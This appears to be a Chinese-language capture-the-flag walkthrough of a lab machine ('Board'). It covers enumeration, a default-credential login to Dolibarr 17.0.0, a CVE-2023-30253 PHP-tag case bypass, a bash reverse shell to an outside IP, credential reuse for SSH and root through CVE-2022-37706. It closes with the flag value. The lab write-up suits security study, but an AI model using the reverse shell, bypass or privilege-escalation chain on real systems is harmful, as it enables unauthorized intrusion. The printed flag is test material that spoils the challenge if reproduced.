連進網站後先用nmap去看看他開啟哪些服務 有22跟80也就是ssh跟http 應該也就是想辦法獲得ssh帳號密碼進入並提權拿到flag
![image](https://hackmd.io/_uploads/SyfxFob_0.png)

再來使用dirsearch 進行目錄爆破看有沒有感興趣的目錄 但掃出來的權限也都不足
![image](https://hackmd.io/_uploads/rJa5FiW_0.png)

於是去訪問他的網站看有沒有什麼地方可以利用的 但也都沒反應
![image](https://hackmd.io/_uploads/BysucjbOR.png)

滑到最下面有看到她的domain `Board.htb` 把它加入到`/etc/hosts`後一樣沒有反應
![image](https://hackmd.io/_uploads/ByRFcKz_R.png)

![image](https://hackmd.io/_uploads/SJAOqtzuA.png)


所以這時候就要來找看看他的subdomain 我這邊用的是`ffuf`他的[github](https://github.com/ffuf/ffuf)還有[wiki](https://github.com/ffuf/ffuf/wiki) 其他還有像是`wfuzz` `gobuster` 可以使用
```
ffuf -u http://Board.htb -w /usr/share/wordlists/subdomains-top1million-110000.txt -H "Host:FUZZ.Board.htb -c -fw 6243
```
`-u` 是要掃得url `-w`是指定字典檔 `-H`是因為我們要掃subdomain所以指定他 而`FUZZ`部分就是我們要進行爆破的地方 `-fw`是指除了大小為6243之外的都回傳

指定6243是因為發現錯誤回傳的大小都是6243 因此只要不是6243大小的應該就是正確subdomain 這邊變掃出了`crm`這個subdomain
![image](https://hackmd.io/_uploads/ByhCnYzOA.png)

把`crm.Board.htb`也加入`/etc/hosts`裡面
![image](https://hackmd.io/_uploads/HkjHCFzOC.png)

訪問`crm.Board.htb`後得到這個網站 上方有他的版本號 是`Dolibarr 17.0.0`
![image](https://hackmd.io/_uploads/SJtVAFGOC.png)

上網找看看有沒有相關的CVE 發現有`CVE-2023-30253` 可以參考這個文章[原理介紹跟腳本](https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253?tab=readme-ov-file)
![image](https://hackmd.io/_uploads/ByZICQ4_0.png)

上網搜尋Dolibarr的預設帳密為 `admin` `admin` 並成功登入
![image](https://hackmd.io/_uploads/SJMeNtcO0.png)

照著剛剛CVE的漏洞嘗試看看 先創個網站
![image](https://hackmd.io/_uploads/HJoK_Kc_0.png)

再弄個頁面
![image](https://hackmd.io/_uploads/HkfhuF9OC.png)

點擊`Edit HTML Source` 進去修改他的HTML 嘗試放php code發現會被擋
![image](https://hackmd.io/_uploads/By6ott5_A.png)

修改大小寫後就發現可以了 並且也可以執行
![image](https://hackmd.io/_uploads/ByERKK5_A.png)
![image](https://hackmd.io/_uploads/HyeG9t5OC.png)

這邊就可以嘗試放個reverse shell`<?pHp exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.65/1010 0>&1'"); ?>`
![image](https://hackmd.io/_uploads/Syx92K5O0.png)

然後起一個監聽
![image](https://hackmd.io/_uploads/r17BhF9dR.png)

就成功去了
![image](https://hackmd.io/_uploads/SyJOhKcdC.png)

這邊可以加個`python3 -c 'import pty;pty.spawn("/bin/bash")'` 弄個pty出來 會比較好看
![image](https://hackmd.io/_uploads/r1vWCYq_A.png)

在`~/html/crm.board.htb/htdocs/conf`裡的conf.php發現了username跟密碼 : `dolibarrowner` `serverfun2$2023!!`
![image](https://hackmd.io/_uploads/BJua75q_R.png)

ssh登入失敗 在`/home`目錄找到一個叫 `larissa` 用他的名字當username登入看看成功了
![image](https://hackmd.io/_uploads/H1AQ459dC.png)

想使用`sudo -l` 看看有沒有甚麼能提權的方法 但沒有
![image](https://hackmd.io/_uploads/rkDnrz4OC.png)

用[`linpeas`](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)來掃描 用法 先`wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64` 裝到本地

本地架一個`python3 -m http.server 9999` 
然後在目標靶機把她載下來`wget http://10.10.14.94:9999/linpeas.sh` 
![image](https://hackmd.io/_uploads/Hy6hEcc_0.png)

最後chmod完就直接`./linpeas.sh| tee output.txt`執行

在linpeas掃描出來的output.txt裡面可以看到 在SUID這裡 有使用到`enlightenment`的服務 可能有可以提權的問題
![image](https://hackmd.io/_uploads/r1v74GE_0.png)

查看enlightenment版本後發現是0.23.1
![image](https://hackmd.io/_uploads/rk1RbzEOR.png)

上網搜尋後發現`CVE-2022-37706`這個CVE 原因主要是因為setuid的問題導致用戶可以提權 詳細原理可以看[這個](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) 一樣透過剛剛架的服務把下載下來的exploit上傳到主機裡
![image](https://hackmd.io/_uploads/SyfdWzNuA.png)

修改權限後並執行就可以發現變成root權限 這時就可以去flag資料夾拿flag了
`flag:71cf37bc68726deb2d71eed76250aa20`
![image](https://hackmd.io/_uploads/Hknx-fV_R.png)

![image](https://hackmd.io/_uploads/S16e0ucdA.png)

